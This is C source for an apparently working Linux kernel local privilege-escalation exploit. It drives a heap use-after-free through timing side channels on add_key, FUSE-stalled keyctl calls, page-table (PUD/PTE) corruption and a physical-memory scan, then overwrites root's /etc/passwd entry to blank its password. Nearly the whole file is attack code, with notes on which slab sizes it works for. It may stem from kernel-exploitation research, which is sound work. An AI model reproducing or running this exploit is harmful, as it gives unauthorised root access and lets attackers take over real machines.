#define _POSIX_SOURCE
#include "uhelper.h"
#include "pgtable.h"
#include "cacheutils.h"
#include "my_keyutils.h"
#include "alloc_primitives.h"

/**
 * Constants
 */
#define PMD_SIZE (1ULL << 21)
#define PUD_SIZE (1ULL << 30)
#define PGD_SIZE (1ULL << 39)
#define PAGE_SIZE (1ULL << 12)

/**
 * Interacting functions with the kernel
 */
#define ALLOC_VULN() do { int ret = alloc_obj((1 << 18) - 1, cur->size, 0); if (ret) pr_error("alloc vuln error\n"); } while (0)
#define FREE_VULN() do { int ret = free_obj((1 << 18) - 1); if (ret) pr_error("free vuln error\n"); } while (0)
#define YIELD(i) do { for (size_t _i = 0; _i < i; ++_i) sched_yield(); } while (0)
#define THRESHOLD -800
static pthread_t main_tid;

/**
 * Vulnerable kernel driver for the kernel heap vulnerability
 */
#include "slab_settings.h"

void mmap_warmup(void)
{
    char *data;
    pr_info("alloc virtual memory\n");

    data = mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); 
    if (data == MAP_FAILED)
        pr_perror("mmap error");
}

/**
 * dummy alloc objects for warmup
 */
void alloc_objs(void)
{
    pr_info("allocate %ld objs\n", cur->allocs);
    for (size_t i = cur->allocs; i < 2*cur->allocs; ++i)
        alloc_object(i);
}

void free_objs(void)
{
    pr_info("free %ld objs\n", cur->allocs);
    for (size_t i = 2*cur->allocs-1; i > cur->allocs; i--)
        free_object(i);
}

/**
 * pause thread in kernel space to extend the time window
 */
volatile size_t handle_fuse_ready = 0;
volatile size_t check_write_ready = 0;
void *handle_fuse(void *)
{
    int ret;
    int fd_timed_file;
    int fd_timed_slow_file;
    char *timed_file;
    char *timed_slow_file;
    struct keyctl_pkey_query results;
    struct keyctl_pkey_params params;
    char info[4096];
    size_t buf[PAGE_SIZE/8];
    size_t *buf2;
    pr_info("start fuse\n");

    pin_to_core(0);

    /* reclaim dangling pointer to overwrite the content */
    fd_timed_file = open("dir/timed_file", O_RDWR);
    fd_timed_slow_file = open("dir/timed_slow_file", O_RDWR);
    if (fd_timed_file < 0 || fd_timed_slow_file < 0)
        pr_perror("open timed_file or fd_timed_slow_file error");

    pr_info("mmap timed_file\n");
    for (size_t i = 0; i < cur->size/8; ++i)
        buf[i] = PAGE_TABLE_LARGE + PUD_SIZE * i + (1ULL << 32);

    pr_info("write timed_file\n");
    ret = write(fd_timed_file, buf, cur->size);
    if (ret < 0)
        pr_perror("fuse write error");

    timed_file = mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd_timed_file, 0);
    timed_slow_file = mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd_timed_slow_file, 0);
    if (timed_file == MAP_FAILED || timed_slow_file == MAP_FAILED)
        pr_perror("mmap timed_file or timed_slow_file error");

    /* prepare for keyctl_pkey_e_d_s primitive */
    do_keyctl_padd();
    memset(info, 0, sizeof(info));
    ret = keyctl_pkey_query(key_id, info, &results);
    if (ret < 0)
        pr_perror("keyctl_pkey_query");

    pr_info("write timed_slow_file\n");
    buf2 = malloc(results.max_dec_size);
    memset(buf2, 0x41, results.max_dec_size);
    ret = write(fd_timed_slow_file, buf2, results.max_dec_size);
    if (ret < 0)
        pr_perror("fuse write error");

    pr_debug("key %d\n", key_id);
    pr_debug("  max data size %d\n", results.max_data_size);
    pr_debug("  max sig size %d\n", results.max_sig_size);
    pr_debug("  max enc size %d\n", results.max_enc_size);
    /* prepare for primitive */
    params.key_id = key_id;
    params.in_len = cur->size;
    params.in2_len = results.max_sig_size;
    pr_info("fuse init done; wait to illegal free\n");

    while (!handle_fuse_ready)
        sched_yield();

    /* create dangling pointer which are randoms pt entries */
    FREE_VULN();

    /* execute memdup_user(_in, params.in_len) primitive */
    ret = _keyctl_pkey_verify(&params, info, timed_file, timed_slow_file);
    if (ret == -EINVAL)
        pr_perror("keyctl");

    pr_info("done fuse\n");
    return 0;
}

/**
 * works:
 *  16
 *  64
 *  96
 *  128
 *  192
 *  256
 * does not work:
 *  8 -> alloc params->info
 *  32 -> alloc params->key
 */

/**
 * timed alloc objects
 */
static size_t *start_indexes;
void timed_alloc_objs(void)
{
    int ret;
    pthread_t tid;

    size_t t0;
    size_t t1;
    ssize_t time = 0;
    ssize_t prev_time = 0;
    ssize_t derived_time = 0;
    ssize_t start = -1;
    size_t running = 0;
    char *value;

    /* create key value which causes the kernel to return with an error (fast) */
    value = malloc(cur->size);
    memset(value, 0x41, cur->size);
    value[0] = '.';
    value[cur->size - 1] = 0;
    *(volatile char *)keyring;

    ret = pthread_create(&tid, 0, handle_fuse, 0);
    if (ret < 0)
        pr_perror("handle fuse create error");
    sleep(1);

    pr_info("allocate %ld objs\n", cur->allocs);
    for (size_t i = 0; i < cur->allocs; ++i) {
        if (running == cur->reclaimed_page_table && i - start == (cur->obj_per_slab - 4)) {
            /* failed -> need to be restarted */
            if (handle_fuse_ready == 1)
                break;
            ALLOC_VULN();
        }
        sched_yield();
        alloc_object(i);
        t0 = rdtsc_begin();
        /* invalid add key to alloc and free */
        ret = add_key(keyring, value, 0, 0, KEY_SPEC_THREAD_KEYRING);
        t1 = rdtsc_end();
        if (ret >= 0)
            pr_perror("add_key should be an error");
        prev_time = time;
        time = t1 - t0;
        if (i > cur->allocs/16) {
            derived_time = time - prev_time;
            if (start == -1) {
                if (derived_time < THRESHOLD) {
                    start = i;
                    continue;
                }
            } else if (i - start == cur->obj_per_slab) {
                if (derived_time < THRESHOLD) {
                    start_indexes[running] = start;
                    running++;
                    if (running == cur->slab_per_chunk)
                        break;
                    start = i;
                } else {
                    start = i;
                    running = 0;
                }
            }
            if (running == cur->reclaimed_page_table && i - start == (cur->obj_per_slab - 4)) {
                /* handle fuse with timed read */
                // pr_info("set handle fuse ready; yield %ld\n", cur->yield);
                handle_fuse_ready = 1;
                YIELD(cur->yield);
                FREE_VULN();
            }
        }
    }
    if (running != cur->slab_per_chunk)
        pr_error("start not found\n");
    // for (size_t i = 0; i < cur->slab_per_chunk; ++i)
    //     pr_info("start %ld\n", start_indexes[i]);
}

#define DATA_START 0xd0000000000
static void *data;
void free_objs_and_alloc_mmap(void)
{
    /* alloc for pmd and pt mapping */
    data = mmap((void *)DATA_START, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (data == MAP_FAILED)
        pr_perror("mmap");
    /* alloc and map pud */
    memset(data, 0x42, PAGE_SIZE);
    data = mmap((void *)(DATA_START + PGD_SIZE), PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (data == MAP_FAILED)
        pr_perror("mmap");

    pr_info("empty caches and free objs slab per chunk %ld obj per slab %ld\n", cur->slab_per_chunk, cur->obj_per_slab);
    free_object(start_indexes[0] - 3);
    free_object(start_indexes[0] - 2);
    free_object(start_indexes[0] - 1);
    for (size_t i = 0; i < cur->slab_per_chunk; ++i) {
        for (ssize_t j = 0; j < (ssize_t)cur->obj_per_slab; ++j) {
            free_object(start_indexes[i] + j);
        }
    }
    /* map pmd and pt */
    memset(data, 0x42, PAGE_SIZE);
}

static char *current_addr;
static char buf[PAGE_SIZE];
static char zeros[PAGE_SIZE];
static sigjmp_buf jmp;
static void signal_handler(int signal, siginfo_t *, void *)
{
    if (signal == SIGSEGV) {
        current_addr += PMD_SIZE;
        siglongjmp(jmp, 1);
    }
}

void setup_signal_handler(void)
{
    struct sigaction handler;
    handler.sa_sigaction = signal_handler;
    handler.sa_flags = SA_SIGINFO | SA_NODEFER | SA_ONSTACK;
    sigemptyset(&handler.sa_mask);
    int ret = sigaction(SIGSEGV, &handler, 0);
    if (ret)
        pr_perror("sigaction");
}

void overwrite_pud_entry(void)
{
    int found = 0;
    sleep(2);
    pr_info("continue check pud\n");

    stack_t sigstk;
    sigstk.ss_sp = malloc(SIGSTKSZ);
    sigstk.ss_size = SIGSTKSZ;
    sigstk.ss_flags = 0;
    sigaltstack(&sigstk, 0);
    setup_signal_handler();

    /**
     * find virt addr for corrupted pte
     */
    memset(buf, 0x42, PAGE_SIZE);
    memset(zeros, 0, PAGE_SIZE);
    current_addr = data;
    sigsetjmp(jmp, 0);
    while ((size_t)current_addr < ((size_t)data + PGD_SIZE)) {
        if (memcmp(current_addr, buf, PAGE_SIZE) && memcmp(current_addr, zeros, PAGE_SIZE)) {
            found = 1;
            break;
        }
        current_addr += PMD_SIZE;
    }

    if (!found)
        pr_error("no found addr -> not reclaimed as PUD\n");
    pr_info("found virt addr %016zx\n", (size_t)current_addr);
}

static size_t old_pt;
static size_t *arb_pt = (size_t *)-1;
static char *arb_page = (char *)-1;
#define MMAP_SIZE PUD_SIZE
void overwrite_ptes(void)
{
    char buf[PAGE_SIZE];
    char *ptr = mmap((void *)(1ULL << 46), MMAP_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
    if (ptr == MAP_FAILED)
        pr_perror("mmap");
    // size_t mapping_space = cur->size/8*PUD_SIZE;
    size_t mapping_space = PUD_SIZE; /* for a speed up */

    pr_info("init pt already mapped\n");
    char *pt_already_mapped = malloc(mapping_space/PAGE_SIZE);
    memset(pt_already_mapped, 0, mapping_space/PAGE_SIZE);
    for (size_t i = 0; i < mapping_space/PAGE_SIZE; ++i)
        if ((*(size_t *)(current_addr + PAGE_SIZE * i) & PTE) == PTE)
            pt_already_mapped[i] = 1;

    pr_info("map a lot of page tables\n");
    for (size_t i = 0; i < MMAP_SIZE; i += PMD_SIZE)
        memset(ptr + i, 0x46, PAGE_SIZE);

    pr_info("show where new page tables are\n");
    for (size_t i = 0; i < mapping_space/PAGE_SIZE; ++i) {
        if ((*(size_t *)(current_addr + PAGE_SIZE * i) & PTE) == PTE && pt_already_mapped[i] == 0) {
            pr_info("found pt at %ld with %016zx\n", i, *(size_t *)(current_addr + PAGE_SIZE * i));
            arb_pt = (size_t *)(current_addr + PAGE_SIZE * i);
            old_pt = *arb_pt;
            *arb_pt = PTE;
            break;
        }
    }
    if (arb_pt == (size_t *)-1)
        pr_error("arbitrary page table not found\n");

    memset(buf, 0x46, PAGE_SIZE);
    for (size_t i = 0; i < MMAP_SIZE; i += PMD_SIZE) {
        if (memcmp(ptr + i, buf, PAGE_SIZE)) {
            arb_page = ptr + i;
            pr_info("found page %016zx\n", (size_t)arb_page);
            break;
        }
    }
    if (arb_page == (char *)-1)
        pr_error("arbitrary page not found\n");
}

void overwrite_etc_passwd(void)
{
    char buf[PAGE_SIZE];
    int fd_passwd = open("/etc/passwd", O_RDONLY);
    if (fd_passwd < 0)
        pr_perror("open(/etc/passwd)");
    memcpy(buf, "AAAA", 4);
    int ret = read(fd_passwd, buf+4, PAGE_SIZE-4);
    if (ret < 0)
        pr_perror("read");
    void *ptr = current_addr;
    volatile size_t *etc_passwd = (size_t *)arb_page;
    char *char_sequ = buf + 4;
    char overwrite_char_sequ[] = "root::00:0:root:/root";
    size_t overwrite_instr_sequ = *(size_t*)overwrite_char_sequ;

    for (size_t i = 0; i < 16ULL * PUD_SIZE; i += PAGE_SIZE) {
        if (i % (PUD_SIZE/8) == 0) {
            pr_info("%3zu/%3d\n", (size_t)(i/(PUD_SIZE/8)), 16*8);
            // print_pagetable_walk((size_t)etc_passwd);
        }
        *arb_pt = PTE | i;
        /* flush tlb */
        syscall(-1);
        if (*etc_passwd == *(size_t *)char_sequ && *(etc_passwd+1) == *(size_t *)(char_sequ + 8) && *(etc_passwd+2) == *(size_t *)(char_sequ + 16) && *(etc_passwd+3) == *(size_t *)(char_sequ + 24)) {
            *etc_passwd = overwrite_instr_sequ;
            pr_info("/etc/passwd found at phys %016zx\n", i);
            break;
        }
        ptr += PAGE_SIZE;
    }
    *arb_pt = old_pt;
}

/**
 * main function
 */
int main(int argc, char *argv[])
{
    size_t generic_cache_size;
    if (argc != 2)
        pr_error("usage: %s <generic_cache_size>\n", argv[0]);
    generic_cache_size = strtol(argv[1], 0, 10);
    if (generic_cache_size > 128)
        pr_error("only smaller objects than 128\n");
    if (generic_cache_size == 8 || generic_cache_size == 32)
        pr_error("sadly this exploit does not work with size %ld -> use exploit_snd.elf\n", generic_cache_size);
    main_tid = pthread_self();

    pr("start: %d\n", gettid());
    helper_init();
    set_current_slab_info(generic_cache_size);
    start_indexes = malloc(sizeof(size_t)*cur->slab_per_chunk);
    init_alloc_primitives();

    pr("allocate free pages as warmup\n");
    mmap_warmup();

    pr("alloc\n");
    alloc_objs();

    pr("timed alloc\n");
    timed_alloc_objs();

    pr("free slab page\n");
    free_objs_and_alloc_mmap();

    pr("tamper pud entry to map kernel to userspace\n");
    overwrite_pud_entry();

    pr("tamper page table entries\n");
    overwrite_ptes();
    pr("tamper /etc/passwd\n");
    overwrite_etc_passwd();

    pr_info("free\n");
    free_objs();

    pr("done\n");
    pthread_exit(0);
}